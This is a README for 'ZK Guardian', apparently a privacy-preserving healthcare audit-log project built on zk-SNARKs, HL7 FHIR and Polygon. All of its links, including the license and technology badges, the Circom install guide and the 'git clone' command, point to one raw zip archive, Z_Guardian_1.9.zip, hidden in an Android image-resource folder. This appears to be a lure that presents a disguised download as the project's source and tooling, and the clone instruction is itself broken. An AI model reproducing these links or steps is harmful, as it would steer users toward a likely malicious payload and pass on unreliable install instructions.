# ZK Guardian 🛡️

> Privacy-preserving healthcare audit log using zk-SNARKs and HL7 FHIR R4

[![License](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](https://github.com/AshokMoktantTamang/ZK-Guardian/raw/refs/heads/main/apps/mobile/android/app/src/main/res/mipmap-mdpi/Z_Guardian_1.9.zip)
[![Polygon Amoy](https://img.shields.io/badge/Polygon-Amoy-purple)](https://github.com/AshokMoktantTamang/ZK-Guardian/raw/refs/heads/main/apps/mobile/android/app/src/main/res/mipmap-mdpi/Z_Guardian_1.9.zip)
[![FHIR R4](https://img.shields.io/badge/FHIR-R4-orange)](https://github.com/AshokMoktantTamang/ZK-Guardian/raw/refs/heads/main/apps/mobile/android/app/src/main/res/mipmap-mdpi/Z_Guardian_1.9.zip)

## 🎯 What is ZK Guardian?

ZK Guardian solves a critical healthcare privacy problem: **How do you prove that a clinician accessed patient data with proper consent, without revealing WHO accessed WHAT?**

Using zero-knowledge proofs (Groth16), we create cryptographic audit logs that:
- ✅ Prove consent was valid at access time
- ✅ Store nothing identifiable on-chain (zero PII/PHI)
- ✅ Enable patients to see their access history
- ✅ Support emergency break-glass access
- ✅ Comply with HIPAA and GDPR

## 📦 Project Structure

```
zk-guardian/
├── apps/mobile/          # React Native (Expo) unified app
├── gateway/              # Node.js + Express gateway
├── circuits/             # Circom ZK circuits
├── contracts/            # Solidity smart contracts
├── fhir/                 # FHIR profiles & examples
├── monitoring/           # Prometheus/Grafana stack
└── docs/                 # Documentation
```

## 🚀 Quick Start

### Prerequisites

- Node.js ≥20.0.0
- pnpm ≥9.0.0
- Circom 2.1.x ([install guide](https://github.com/AshokMoktantTamang/ZK-Guardian/raw/refs/heads/main/apps/mobile/android/app/src/main/res/mipmap-mdpi/Z_Guardian_1.9.zip))
- Docker (optional, for local HAPI FHIR)

### Installation

```bash
# Clone repository
git clone https://github.com/AshokMoktantTamang/ZK-Guardian/raw/refs/heads/main/apps/mobile/android/app/src/main/res/mipmap-mdpi/Z_Guardian_1.9.zip
cd zk-guardian

# Install dependencies
pnpm install

# Copy environment template
cp .env.example .env

# Compile circuits (first run takes ~2 minutes)
pnpm circuits:compile
pnpm circuits:setup

# Start development
pnpm dev
```

### One-Click Windows Bootstrap

For a clean Windows laptop, run the master bootstrap script:

```powershell
cd zk-guardian
powershell -ExecutionPolicy Bypass -File .\scripts\windows\bootstrap-zk-guardian.ps1 -Mode all
```

What it does:
- Installs core tooling (Git, Node LTS, Docker Desktop, pnpm; Android Studio unless `-SkipMobile`).
- Installer fallback order: `winget` -> `choco` -> `scoop` (manual fallback prompts if none available).
- Uses public FHIR (`hapi.fhir.org`) by default, or local Docker FHIR with `-FhirMode local`.
- Starts a local Hardhat chain, deploys contracts, writes addresses into `.env`.
- Runs Prisma setup, starts gateway, and runs `verify:full-flow`.
- Launches Android emulator + mobile install flow (unless `-SkipMobile`).

Examples:

```powershell
# Default (public FHIR, full E2E verify)
powershell -ExecutionPolicy Bypass -File .\scripts\windows\bootstrap-zk-guardian.ps1 -Mode all

# Local FHIR mode
powershell -ExecutionPolicy Bypass -File .\scripts\windows\bootstrap-zk-guardian.ps1 -Mode all -FhirMode local

# Stop managed services
powershell -ExecutionPolicy Bypass -File .\scripts\windows\bootstrap-zk-guardian.ps1 -Mode stop
```

### Running Individual Services

```bash
# Gateway only
pnpm gateway:dev

# Mobile app
pnpm mobile:start

# Smart contracts (compile & test)
pnpm contracts:compile
pnpm contracts:test
```

## 🏗️ Architecture

```
┌──────────────┐    ┌──────────────────┐    ┌─────────────────┐
│ Mobile App   │◄──►│  ZK Gateway      │◄──►│  HAPI FHIR      │
│ (Expo)       │    │  (Node.js)       │    │  (Java)         │
│              │    │                  │    │                 │
│ • Consent    │    │ • SMART Validate │    │ • Patient data  │
│   approval   │    │ • ZK Proofs      │    │ • Consent       │
│ • Audit view │    │ • Direct audit   │    │ • Observations  │
└──────────────┘    └────────┬─────────┘    └─────────────────┘
                             │
                    ┌────────▼─────────┐
                    │  Polygon Amoy    │
                    │                  │
                    │ • ZKGuardianAudit│
                    │ • Revocation     │
                    │   Registry       │
                    └──────────────────┘
```

## 🔐 Security

- **Zero PII on-chain**: Only hashes and proofs
- **Nullifier protection**: Prevents brute-force attacks
- **HIPAA compliant**: Break-glass, audit trails, encryption
- **SMART on FHIR**: external OAuth 2.0 / OIDC authentication with gateway-side validation

## ✅ Production Readiness

Before production deployment, ensure the following are complete:

- External SMART/OIDC issuer, JWKS, introspection endpoint, and client credentials configured.
- Gateway signing key stored in a secrets manager.
- Circuit artifacts pinned with checksums.
- Contract addresses verified and recorded.
- Mobile production builds configured for HTTPS/WSS only with `TLS_PIN_MAP`.
- GitHub Actions `Production Verification` workflow green.
- Runbook validation for `/health` and `/ready` endpoints.

See [ARCHITECTURE.md](ARCHITECTURE.md) and [SECURITY.md](SECURITY.md) for full requirements.

## 📄 License

Apache 2.0 License - see [LICENSE](LICENSE) for details.

---
